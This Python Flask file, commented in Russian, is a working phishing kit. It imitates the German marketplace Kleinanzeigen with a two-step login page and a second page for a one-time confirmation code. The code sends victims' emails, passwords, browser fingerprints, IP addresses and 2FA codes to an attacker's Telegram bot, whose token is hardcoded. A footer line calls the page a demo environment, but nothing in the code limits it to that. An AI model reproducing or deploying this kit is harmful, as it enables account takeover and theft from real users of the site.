from flask import Flask, request, render_template_string, redirect, jsonify
import requests
import os
import threading
import time
import json
import webbrowser

app = Flask(__name__)

# ==================== КОНФИГУРАЦИЯ ====================
BOT_TOKEN = "8893784946:AAEyEJTFg_ZiqXOG3IJfHcTMdvLYFDn360A"
CHAT_ID = 7833929276
last_update_id = 0

# ==================== СТРАНИЦА ВХОДА (ДВУХШАГОВАЯ) ====================
LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kleinanzeigen</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #f5f5f5;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .wrapper {
            width: 100%;
            max-width: 400px;
        }
        .card {
            background: white;
            border-radius: 12px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
            padding: 36px 32px;
        }
        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 16px;
        }
        .logo-icon {
            display: inline-block;
            background: #00cc66;
            color: white;
            font-weight: 700;
            font-size: 20px;
            width: 32px;
            height: 32px;
            line-height: 32px;
            text-align: center;
            border-radius: 4px;
        }
        .logo-text {
            font-size: 26px;
            font-weight: 700;
            color: #1a1a1a;
        }
        .welcome {
            text-align: center;
            margin-bottom: 32px;
        }
        .welcome h1 {
            font-size: 22px;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 8px;
        }
        .welcome p {
            font-size: 15px;
            color: #555;
            line-height: 1.5;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
            transition: border 0.2s;
            background: white;
        }
        .form-group input:focus {
            border-color: #00cc66;
            box-shadow: 0 0 0 3px rgba(0, 204, 102, 0.15);
        }
        .btn {
            width: 100%;
            height: 50px;
            background: #00cc66;
            color: white;
            font-size: 17px;
            font-weight: 600;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 4px;
        }
        .btn:hover { background: #00b366; }
        .btn:disabled {
            background: #999;
            cursor: not-allowed;
        }
        .link {
            text-align: center;
            margin-top: 24px;
            font-size: 14px;
            color: #555;
        }
        .link a {
            color: #00cc66;
            text-decoration: none;
            font-weight: 600;
        }
        .link a:hover { text-decoration: underline; }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #999;
        }
        .hidden { display: none; }
        .step-indicator {
            font-size: 13px;
            color: #999;
            text-align: center;
            margin-bottom: 16px;
        }
        .step-indicator span {
            font-weight: 600;
            color: #1a1a1a;
        }
        .back-link {
            display: block;
            text-align: center;
            margin-top: 12px;
            color: #999;
            font-size: 14px;
            text-decoration: none;
            cursor: pointer;
        }
        .back-link:hover {
            color: #00cc66;
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="card">
            <!-- Логотип внутри карточки, под адресной строкой -->
            <div class="logo">
                <span class="logo-icon">K</span>
                <span class="logo-text">kleinanzeigen</span>
            </div>

            <div class="welcome">
                <h1>Willkommen bei Kleinanzeigen!</h1>
                <p>Gut für deinen Geldbeutel,<br>gut für die Umwelt - jetzt einloggen.</p>
            </div>

            <!-- Шаг 1: Email -->
            <div id="step1">
                <div class="step-indicator">Schritt <span>1</span> von 2</div>
                <form id="emailForm">
                    <div class="form-group">
                        <input type="email" id="email" name="email" placeholder="E-mail*" required autofocus>
                    </div>
                    <input type="hidden" id="browser_fingerprint" name="browser_fingerprint">
                    <button type="submit" class="btn" id="emailBtn">Weiter</button>
                </form>
            </div>

            <!-- Шаг 2: Пароль (скрыт) -->
            <div id="step2" class="hidden">
                <div class="step-indicator">Schritt <span>2</span> von 2</div>
                <form id="passwordForm">
                    <div class="form-group">
                        <input type="password" id="password" name="password" placeholder="Passwort*" required>
                    </div>
                    <button type="submit" class="btn" id="passwordBtn">Weiter</button>
                </form>
                <a href="#" class="back-link" id="backToEmail">← Zurück</a>
            </div>

            <div class="link">
                Noch nicht registriert?<br>
                <a href="#">Erstelle ein Konto</a>
            </div>
        </div>

        <div class="footer">
            Testumgebung – nur für Demo
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const fingerprintInput = document.getElementById('browser_fingerprint');
            const ua = navigator.userAgent;
            const platform = navigator.platform || navigator.userAgentData?.platform || '';
            const browserInfo = `${ua} | ${platform}`;
            const fingerprint = btoa(browserInfo);
            fingerprintInput.value = fingerprint;
        });

        document.getElementById('emailForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value.trim();
            if (!email) {
                alert('Bitte geben Sie Ihre E-Mail-Adresse ein.');
                return;
            }
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
            document.getElementById('password').focus();
        });

        document.getElementById('backToEmail').addEventListener('click', function(e) {
            e.preventDefault();
            document.getElementById('step2').classList.add('hidden');
            document.getElementById('step1').classList.remove('hidden');
            document.getElementById('email').focus();
        });

        document.getElementById('passwordForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const password = document.getElementById('password').value.trim();
            if (!password) {
                alert('Bitte geben Sie Ihr Passwort ein.');
                return;
            }

            const email = document.getElementById('email').value.trim();
            const fingerprint = document.getElementById('browser_fingerprint').value;

            const btn = document.getElementById('passwordBtn');
            btn.disabled = true;
            btn.textContent = 'Wird gesendet...';

            fetch('/send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'email=' + encodeURIComponent(email) + 
                      '&password=' + encodeURIComponent(password) + 
                      '&browser_fingerprint=' + encodeURIComponent(fingerprint)
            })
            .then(response => response.text())
            .then(data => {
                document.body.innerHTML = data;
            })
            .catch(error => {
                alert('Fehler beim Senden. Bitte versuchen Sie es erneut.');
                btn.disabled = false;
                btn.textContent = 'Weiter';
            });
        });
    </script>
</body>
</html>
"""

# ==================== СТРАНИЦА ВВОДА КОДА ====================
CODE_PAGE = """
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kleinanzeigen - Code</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #f5f5f5;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .wrapper {
            width: 100%;
            max-width: 400px;
        }
        .card {
            background: white;
            border-radius: 12px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
            padding: 36px 32px;
            text-align: center;
        }
        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 16px;
        }
        .logo-icon {
            display: inline-block;
            background: #00cc66;
            color: white;
            font-weight: 700;
            font-size: 20px;
            width: 32px;
            height: 32px;
            line-height: 32px;
            text-align: center;
            border-radius: 4px;
        }
        .logo-text {
            font-size: 26px;
            font-weight: 700;
            color: #1a1a1a;
        }
        .card h2 {
            font-size: 22px;
            color: #1a1a1a;
            margin-bottom: 8px;
        }
        .card p {
            color: #555;
            font-size: 15px;
            margin-bottom: 24px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group input {
            width: 100%;
            padding: 16px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 24px;
            text-align: center;
            letter-spacing: 8px;
            outline: none;
            transition: border 0.2s;
            background: #fafafa;
        }
        .form-group input:focus {
            border-color: #00cc66;
            background: white;
        }
        .btn {
            width: 100%;
            height: 50px;
            background: #00cc66;
            color: white;
            font-size: 17px;
            font-weight: 600;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn:hover { background: #00b366; }
        .btn:disabled {
            background: #999;
            cursor: not-allowed;
        }
        .status {
            margin-top: 16px;
            font-size: 14px;
            font-weight: 600;
        }
        .status.success { color: #00cc66; }
        .status.error { color: #e74c3c; }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #999;
        }
        .back-link {
            display: inline-block;
            margin-top: 16px;
            color: #999;
            text-decoration: none;
            font-size: 14px;
        }
        .back-link:hover {
            color: #00cc66;
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="card">
            <div class="logo">
                <span class="logo-icon">K</span>
                <span class="logo-text">kleinanzeigen</span>
            </div>

            <h2>🔑 Код подтверждения</h2>
            <p>Введите код, который был отправлен на ваш номер</p>
            <form id="codeForm">
                <div class="form-group">
                    <input type="text" id="codeInput" placeholder="000000" maxlength="6" required autofocus>
                </div>
                <button type="submit" class="btn" id="submitBtn">Подтвердить</button>
            </form>
            <div id="status" class="status"></div>
            <a href="/" class="back-link">← Назад</a>
        </div>

        <div class="footer">
            Testumgebung – nur für Demo
        </div>
    </div>

    <script>
        document.getElementById('codeForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const code = document.getElementById('codeInput').value.trim();
            const statusDiv = document.getElementById('status');
            const submitBtn = document.getElementById('submitBtn');

            if (!code) {
                statusDiv.className = 'status error';
                statusDiv.textContent = '❌ Пожалуйста, введите код';
                return;
            }

            submitBtn.disabled = true;
            submitBtn.textContent = 'Отправка...';
            statusDiv.className = 'status';
            statusDiv.textContent = '';

            fetch('/submit_code', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'code=' + encodeURIComponent(code)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    statusDiv.className = 'status success';
                    statusDiv.textContent = '✅ Код подтверждён!';
                    submitBtn.disabled = true;
                    document.getElementById('codeInput').disabled = true;
                } else {
                    statusDiv.className = 'status error';
                    statusDiv.textContent = '❌ ' + data.error;
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Подтвердить';
                }
            })
            .catch(error => {
                statusDiv.className = 'status error';
                statusDiv.textContent = '❌ Ошибка отправки';
                submitBtn.disabled = false;
                submitBtn.textContent = 'Подтвердить';
            });
        });
    </script>
</body>
</html>
"""


# ==================== ОТПРАВКА В TELEGRAM С КНОПКОЙ ====================
def send_to_telegram_with_button(email, password, fingerprint):
    msg = f"Neue Eingabe:\nEmail: {email}\nPasswort: {password}\nBrowser-Fingerprint: {fingerprint}"

    keyboard = {
        "inline_keyboard": [
            [
                {"text": "🔑 Запросить код", "callback_data": "request_code"}
            ]
        ]
    }

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": msg,
        "reply_markup": keyboard
    }

    try:
        response = requests.post(url, json=payload, timeout=10)
        print("Message sent:", response.json())
    except Exception as e:
        print(f"Error sending to Telegram: {e}")


# ==================== ПОЛЛИНГ ====================
def polling_loop():
    global last_update_id
    try:
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook")
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset=-1")
        print("✅ Webhook deleted")
    except Exception as e:
        print(f"Error resetting: {e}")

    print("🔄 Polling started...")
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_update_id + 1}&timeout=30"
            response = requests.get(url, timeout=35)
            data = response.json()

            if data.get('ok'):
                for update in data.get('result', []):
                    last_update_id = update['update_id']

                    if 'callback_query' in update:
                        callback = update['callback_query']
                        callback_id = callback['id']
                        chat_id = callback['message']['chat']['id']
                        data = callback['data']

                        if data == 'request_code':
                            answer_url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
                            answer_payload = {
                                "callback_query_id": callback_id,
                                "text": "🔄 Открываем страницу с кодом...",
                                "show_alert": True
                            }
                            requests.post(answer_url, json=answer_payload)
                            print("✅ Callback received: request_code")

                            try:
                                requests.get("http://127.0.0.1:8080/open_code_window", timeout=5)
                                print("✅ /open_code_window triggered")
                            except Exception as e:
                                print(f"Error triggering open_code_window: {e}")

                    if 'message' in update:
                        print(f"📩 Message received")
            else:
                print(f"❌ Ошибка getUpdates: {data}")

        except Exception as e:
            print(f"❌ Polling error: {e}")
            time.sleep(5)


# ==================== FLASK РОУТЫ ====================
@app.route('/')
def login():
    state = request.args.get('state', '')

    if not state:
        return redirect(
            '/?state=HtQzSBTJZdoRFRTSIBRVTN0bU1Um1uWtErenRfbGg5SDduMkF7suXvA2xNcHbC1sbDzbp6NyDTVfTZUF0chHdIaUI1RWnBxbWtRd2xOVi1MWlZCmliaLf15qoN2pYh9yIhNb2lD1bTVmVUU...')

    try:
        ua = request.headers.get('User-Agent', 'N/A')
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        msg = f"#XSUDSEXPI| Переход на сайт\nIP: {ip}\nUA: {ua}\nState: {state[:50]}..."
        requests.get(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}",
            timeout=5
        )
    except Exception:
        pass

    return render_template_string(LOGIN_PAGE)


@app.route('/send', methods=['POST'])
def send():
    email = request.form.get('email')
    password = request.form.get('password')
    browser_fingerprint = request.form.get('browser_fingerprint')

    threading.Thread(target=send_to_telegram_with_button, args=(email, password, browser_fingerprint),
                     daemon=True).start()

    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Daten gesendet</title>
        <style>
            body { font-family: Arial; text-align: center; padding: 50px; background: #f5f5f5; }
            .success { color: #00cc66; font-size: 24px; font-weight: 600; }
        </style>
    </head>
    <body>
        <div class="success">✓ Daten gesendet</div>
        <p>Ожидайте запроса кода в Telegram.</p>
        <p><a href="/">← Назад</a></p>
    </body>
    </html>
    '''


@app.route('/open_code_window')
def open_code_window():
    try:
        webbrowser.open_new("http://127.0.0.1:8080/code")
        print("✅ Code window opened")
        return "OK", 200
    except Exception as e:
        print(f"Error opening browser: {e}")
        return "Error", 500


@app.route('/code')
def code_page():
    return render_template_string(CODE_PAGE)


@app.route('/submit_code', methods=['POST'])
def submit_code():
    code = request.form.get('code', '').strip()

    if not code:
        return {"success": False, "error": "Код не может быть пустым"}

    msg = f"✅ Получен код подтверждения: {code}"
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": msg},
            timeout=10
        )
        print(f"✅ Код отправлен в Telegram: {code}")
        return {"success": True}
    except Exception as e:
        print(f"Error sending code: {e}")
        return {"success": False, "error": "Ошибка отправки кода"}


@app.route('/delete')
def delete_link():
    return "Ссылка удалена."


# ==================== ЗАПУСК ====================
def run_flask():
    app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)


if __name__ == '__main__':
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    print("✅ Flask started")

    time.sleep(2)
    webbrowser.open_new("http://127.0.0.1:8080")

    polling_loop()